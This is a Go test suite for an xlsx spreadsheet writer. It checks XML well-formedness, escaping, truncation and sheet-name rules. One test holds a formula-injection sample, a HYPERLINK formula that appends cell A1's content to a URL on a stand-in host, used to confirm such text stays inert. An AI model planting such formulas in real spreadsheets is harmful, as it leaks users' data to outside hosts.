package xlsx

import (
	"archive/zip"
	"bytes"
	"encoding/xml"
	"io"
	"math"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"unicode/utf8"
)

// readBack is a reader written from the spec, not from Write: it opens the
// package, checks every part is well-formed XML, and returns the sheet's cells
// by reference ("B3") with inline strings decoded as Excel decodes them
// (ST_Xstring's _xHHHH_ escape), plus the raw sheet XML.
func readBack(t *testing.T, data []byte) (cells map[string]string, numeric map[string]bool, sheet string) {
	t.Helper()
	z, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatalf("not a zip: %v", err)
	}
	want := []string{"[Content_Types].xml", "_rels/.rels", "xl/workbook.xml", "xl/_rels/workbook.xml.rels", "xl/styles.xml", "xl/worksheets/sheet1.xml"}
	var got []string
	parts := map[string][]byte{}
	for _, f := range z.File {
		got = append(got, f.Name)
		rc, err := f.Open()
		if err != nil {
			t.Fatal(err)
		}
		b, err := io.ReadAll(rc)
		rc.Close()
		if err != nil {
			t.Fatal(err)
		}
		parts[f.Name] = b
		d := xml.NewDecoder(bytes.NewReader(b))
		for {
			if _, err := d.Token(); err == io.EOF {
				break
			} else if err != nil {
				t.Fatalf("%s is not well-formed XML: %v", f.Name, err)
			}
		}
	}
	if strings.Join(got, " ") != strings.Join(want, " ") {
		t.Fatalf("parts %v, want %v", got, want)
	}
	var ws struct {
		Rows []struct {
			R     int `xml:"r,attr"`
			Cells []struct {
				R  string  `xml:"r,attr"`
				T  string  `xml:"t,attr"`
				V  *string `xml:"v"`
				F  *string `xml:"f"`
				Is *struct {
					T string `xml:"t"`
				} `xml:"is"`
			} `xml:"c"`
		} `xml:"sheetData>row"`
	}
	if err := xml.Unmarshal(parts["xl/worksheets/sheet1.xml"], &ws); err != nil {
		t.Fatal(err)
	}
	unescape := regexp.MustCompile(`_x([0-9A-Fa-f]{4})_`)
	cells, numeric = map[string]string{}, map[string]bool{}
	for _, r := range ws.Rows {
		for _, c := range r.Cells {
			if c.F != nil {
				t.Fatalf("cell %s holds a formula", c.R)
			}
			switch {
			case c.T == "inlineStr" && c.Is != nil:
				cells[c.R] = unescape.ReplaceAllStringFunc(c.Is.T, func(m string) string {
					n, _ := strconv.ParseUint(m[2:6], 16, 32)
					return string(rune(n))
				})
			case c.T == "" && c.V != nil:
				cells[c.R], numeric[c.R] = *c.V, true
			default:
				t.Fatalf("cell %s has type %q", c.R, c.T)
			}
		}
	}
	return cells, numeric, string(parts["xl/worksheets/sheet1.xml"])
}

func write(t *testing.T, s Sheet) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := Write(&b, s); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func TestRoundTrip(t *testing.T) {
	s := Sheet{Name: "Jobs", Header: []string{"#", "Title", "Pay"}, Widths: []float64{5, 40},
		Rows: [][]Cell{
			{Number(1), Text("Engineer <ML> & \"Infra\""), Number(185000)},
			{Number(2.5), Text("  leading and trailing  ")},
			{Number(3), Cell{}, Number(-0.125)},
		}}
	cells, numeric, sheet := readBack(t, write(t, s))
	want := map[string]string{"A1": "#", "B1": "Title", "C1": "Pay",
		"A2": "1", "B2": `Engineer <ML> & "Infra"`, "C2": "185000",
		"A3": "2.5", "B3": "  leading and trailing  ",
		"A4": "3", "C4": "-0.125"}
	for ref, v := range want {
		if cells[ref] != v {
			t.Errorf("%s = %q, want %q", ref, cells[ref], v)
		}
	}
	if len(cells) != len(want) {
		t.Errorf("cells %v, want exactly %v", cells, want)
	}
	if !numeric["C2"] || numeric["B2"] {
		t.Errorf("numeric %v", numeric)
	}
	for _, frag := range []string{`<autoFilter ref="A1:C4"/>`, `state="frozen"`, `<c r="A1" s="1" t="inlineStr">`,
		`<col min="1" max="1" width="5" customWidth="1"/>`} {
		if !strings.Contains(sheet, frag) {
			t.Errorf("sheet lacks %s", frag)
		}
	}
	// The schema's sequence: sheetViews, cols, sheetData, autoFilter.
	order := []string{"<sheetViews>", "<cols>", "<sheetData>", "<autoFilter"}
	for i := 1; i < len(order); i++ {
		if strings.Index(sheet, order[i-1]) > strings.Index(sheet, order[i]) {
			t.Errorf("%s comes after %s", order[i-1], order[i])
		}
	}
}

// Untrusted text that looks like a formula stays text: no <f>, inline string.
func TestFormulaLikeTextStaysText(t *testing.T) {
	evil := `=HYPERLINK("http://x.test/?"&A1,"click")`
	cells, numeric, sheet := readBack(t, write(t, Sheet{Name: "Jobs", Header: []string{"Title"},
		Rows: [][]Cell{{Text(evil)}, {Text("+1+1")}, {Text("@SUM(A1)")}, {Text("-2")}}}))
	if cells["A2"] != evil || cells["A3"] != "+1+1" || cells["A5"] != "-2" || numeric["A5"] {
		t.Fatalf("cells %v", cells)
	}
	if strings.Contains(sheet, "<f>") {
		t.Fatal("sheet holds a formula")
	}
}

func TestHostileCharacters(t *testing.T) {
	in := "a\x00b\x1bc￾d\xff\xfee\tf\ng\rh"
	cells, _, _ := readBack(t, write(t, Sheet{Name: "Jobs", Header: []string{"x"}, Rows: [][]Cell{{Text(in)}}}))
	want := "a�b�c�d�e\tf\ng\rh"
	if cells["A2"] != want {
		t.Fatalf("got %q, want %q", cells["A2"], want)
	}
}

// Text that spells Excel's _xHHHH_ escape reads back as written, not decoded.
func TestXstringEscapeIsNeutralised(t *testing.T) {
	for _, in := range []string{"_x0041_", "a_x000D_b", "_x005F_x0041_", "_x00", "x_X0041_", "__x0041_", "_x0041__x0042_", "_x0041_x0042_"} {
		cells, _, _ := readBack(t, write(t, Sheet{Name: "Jobs", Header: []string{in}, Rows: [][]Cell{{Text(in)}}}))
		if cells["A1"] != in || cells["A2"] != in {
			t.Errorf("%q read back as %q / %q", in, cells["A1"], cells["A2"])
		}
	}
}

func TestLongTextIsCut(t *testing.T) {
	long := strings.Repeat("é", 40000)
	cells, _, _ := readBack(t, write(t, Sheet{Name: "Jobs", Header: []string{"x"},
		Rows: [][]Cell{{Text(long)}, {Text(strings.Repeat("y", MaxCellRunes))}, {Text(strings.Repeat("_x0041_", 6000))}}}))
	if n := utf8.RuneCountInString(cells["A2"]); n != MaxCellRunes || !strings.HasSuffix(cells["A2"], "…") {
		t.Errorf("40000 runes became %d", n)
	}
	if cells["A3"] != strings.Repeat("y", MaxCellRunes) {
		t.Error("text of exactly the limit was cut")
	}
	// Escaping grew this past the limit; the cut leaves no half-escape that
	// decodes to something else.
	if !strings.HasPrefix(cells["A4"], "_x0041__x0041_") || !strings.HasSuffix(cells["A4"], "…") {
		t.Errorf("escaped long text read back as %q…", cells["A4"][:40])
	}
}

func TestEmptySheetIsHeaderOnly(t *testing.T) {
	cells, _, sheet := readBack(t, write(t, Sheet{Name: "Jobs", Header: []string{"a", "b"}}))
	if len(cells) != 2 || !strings.Contains(sheet, `<autoFilter ref="A1:B1"/>`) {
		t.Fatalf("cells %v", cells)
	}
}

func TestNonFiniteNumbersAreEmpty(t *testing.T) {
	cells, _, _ := readBack(t, write(t, Sheet{Name: "Jobs", Header: []string{"a", "b", "c"},
		Rows: [][]Cell{{Number(math.NaN()), Number(math.Inf(1)), Number(math.Inf(-1))}}}))
	if len(cells) != 3 {
		t.Fatalf("cells %v", cells)
	}
}

func TestColumn(t *testing.T) {
	for i, want := range map[int]string{0: "A", 25: "Z", 26: "AA", 51: "AZ", 52: "BA", 701: "ZZ", 702: "AAA", MaxCols - 1: "XFD"} {
		if got := Column(i); got != want {
			t.Errorf("Column(%d) = %s, want %s", i, got, want)
		}
	}
}

func TestSheetNameIsQuotedInTheFilterName(t *testing.T) {
	data := write(t, Sheet{Name: "Bob's jobs", Header: []string{"a"}, Rows: [][]Cell{{Text("x")}}})
	z, _ := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	for _, f := range z.File {
		if f.Name != "xl/workbook.xml" {
			continue
		}
		rc, _ := f.Open()
		b, _ := io.ReadAll(rc)
		rc.Close()
		var wb struct {
			Sheet struct {
				Name string `xml:"name,attr"`
			} `xml:"sheets>sheet"`
			Defined string `xml:"definedNames>definedName"`
		}
		if err := xml.Unmarshal(b, &wb); err != nil {
			t.Fatal(err)
		}
		if wb.Sheet.Name != "Bob's jobs" || wb.Defined != "'Bob''s jobs'!$A$1:$A$2" {
			t.Fatalf("%+v", wb)
		}
		return
	}
	t.Fatal("no workbook part")
}

func TestRefusesSheetsExcelCannotOpen(t *testing.T) {
	ok := Sheet{Name: "Jobs", Header: []string{"a"}}
	for name, s := range map[string]Sheet{
		"empty name":    {Name: "", Header: ok.Header},
		"long name":     {Name: strings.Repeat("n", MaxSheetName+1), Header: ok.Header},
		"bracket":       {Name: "a[b]", Header: ok.Header},
		"slash":         {Name: "a/b", Header: ok.Header},
		"quote edge":    {Name: "'a", Header: ok.Header},
		"no header":     {Name: "Jobs"},
		"wide row":      {Name: "Jobs", Header: ok.Header, Rows: [][]Cell{{Text("a"), Text("b")}}},
		"invalid utf-8": {Name: "a\xff", Header: ok.Header},
	} {
		var b bytes.Buffer
		if err := Write(&b, s); err == nil {
			t.Errorf("%s: written", name)
		} else if b.Len() != 0 {
			t.Errorf("%s: refused after writing %d bytes", name, b.Len())
		}
	}
}

type failWriter struct{}

func (failWriter) Write([]byte) (int, error) { return 0, io.ErrShortWrite }

func TestWriteErrorsSurface(t *testing.T) {
	rows := make([][]Cell, 2000)
	for i := range rows {
		rows[i] = []Cell{Text(strings.Repeat("z", 100))}
	}
	if err := Write(failWriter{}, Sheet{Name: "Jobs", Header: []string{"a"}, Rows: rows}); err == nil {
		t.Fatal("a failing writer reported success")
	}
}
